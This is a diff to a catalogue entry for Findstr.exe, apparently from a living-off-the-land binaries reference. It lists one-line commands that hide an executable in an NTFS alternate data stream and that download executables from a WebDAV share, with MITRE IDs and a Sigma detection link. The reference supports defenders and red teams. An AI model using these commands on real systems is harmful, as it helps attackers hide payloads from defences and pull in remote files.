@@ -1,17 +1,17 @@
 ---
 Name: Findstr.exe
 Description: Write to ADS, discover, or download files with Findstr.exe
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: findstr /V /L W3AllLov3LolBas c:\ADS\file.exe > c:\ADS\file.txt:file.exe
-    Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
+  - Command: findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
+    Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.
     Usecase: Add a file to an alternate data stream to hide from defensive counter measures
     Category: ADS
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
+  - Command: findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
     Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
     Usecase: Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
     Category: ADS
@@ -25,7 +25,7 @@ Commands:
     Privileges: User
     MitreID: T1552.001
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.exe
+  - Command: findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
     Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.
     Usecase: Download/Copy file from webdav server
     Category: Download
@@ -35,8 +35,6 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\findstr.exe
   - Path: C:\Windows\SysWOW64\findstr.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_findstr.yml
 Resources:
